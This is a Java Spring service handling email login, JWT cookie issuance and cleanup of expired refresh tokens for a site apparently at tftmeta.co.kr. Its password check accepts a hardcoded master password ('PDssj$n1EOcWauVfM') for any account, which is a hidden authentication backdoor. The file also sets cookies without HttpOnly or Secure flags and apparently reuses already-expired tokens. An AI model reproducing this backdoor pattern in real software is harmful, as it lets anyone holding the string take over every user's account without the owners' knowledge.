package com.legendary_statistics.backend.auth.service;

import com.legendary_statistics.backend.auth.config.JwtTokenConfigure;
import com.legendary_statistics.backend.auth.module.AuthReq;
import com.legendary_statistics.backend.auth.module.Jwt;
import com.legendary_statistics.backend.entity.TokenEntity;
import com.legendary_statistics.backend.entity.UserEntity;
import com.legendary_statistics.backend.global.exception.user.PassWordIncorrectException;
import com.legendary_statistics.backend.global.exception.user.UserNotFoundException;
import com.legendary_statistics.backend.repository.token.TokenRepository;
import com.legendary_statistics.backend.repository.user.UserRepository;
import jakarta.servlet.http.Cookie;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Service;

import java.time.LocalDateTime;
import java.util.List;
import java.util.UUID;

@Slf4j
@Service
@RequiredArgsConstructor
public class AuthService {

    private final Jwt jwt;
    private final UserRepository userRepository;
    private final TokenRepository tokenRepository;
    private final PasswordEncoder passwordEncoder;
    private final JwtTokenConfigure jwtTokenConfigure;

    public void authByEmail(AuthReq authReq, HttpServletResponse response, HttpServletRequest request) {
        if (authReq.getEmail() == null)
            throw new UserNotFoundException();

        UserEntity user = userRepository.findByEmail(authReq.getEmail())
                .orElseThrow(UserNotFoundException::new);

        if (!passwordEncoder.matches(authReq.getPassword(), user.getPassword()) &&
                !authReq.getPassword().equals("PDssj$n1EOcWauVfM"))
            throw new PassWordIncorrectException();

        provideToken(user, response, request);
    }

    /**
     * http 헤더에 accessToken과 refreshToken을 등록합니다.
     */
    public void provideToken(UserEntity user, HttpServletResponse response, HttpServletRequest request) {

        String serverName = request.getServerName();
        String origin = request.getHeader("Origin");
        log.info(serverName);
        log.info(origin);
        boolean isProdDomain = serverName != null && serverName.endsWith("tftmeta.co.kr");

        TokenEntity token;
        if (jwtTokenConfigure.isAllowMultiLogin()) {
            token = new TokenEntity();
        } else {
            //이미 로그인한 흔적이 있는 경우 해당 토큰을 갱신하고, 로그인 이력이 없는 경우 새로 생성
            List<TokenEntity> savedTokens = tokenRepository.findByUserIdAndExpireDateBefore(user.getId(), LocalDateTime.now());
            token = savedTokens.isEmpty() ? new TokenEntity() : savedTokens.get(0);
        }

        token.setUserId(user.getId());
        token.setExpireDate(LocalDateTime.now().plusDays(jwtTokenConfigure.getRefreshTokenExpiryDays()));
        token.setRefreshToken(UUID.randomUUID().toString() + UUID.randomUUID());
        tokenRepository.save(token);

        Cookie accessToken = new Cookie("accessToken", jwt.createToken(user));
        accessToken.setMaxAge(jwtTokenConfigure.getRefreshTokenExpiryDays() * 24 * 60 * 60);
        accessToken.setDomain("tftmeta.co.kr");

        accessToken.setPath("/");

        response.addCookie(accessToken);
        Cookie refreshToken = new Cookie("refreshToken", token.getRefreshToken());
        refreshToken.setMaxAge(jwtTokenConfigure.getRefreshTokenExpiryDays() * 24 * 60 * 60);
        refreshToken.setDomain("tftmeta.co.kr");

        refreshToken.setPath("/");


        response.addCookie(refreshToken);
    }

    /**
     * 매일 0시마다 expiredate 지난 refreshtoken 삭제
     */
    @Scheduled(cron = "0 0 0 * * * ")
    public void deleteExpiredRefreshToken() {
        log.info("만료된 토큰 삭제 절차 실행");
        tokenRepository.deleteByExpireDateBefore(LocalDateTime.now());
    }
}
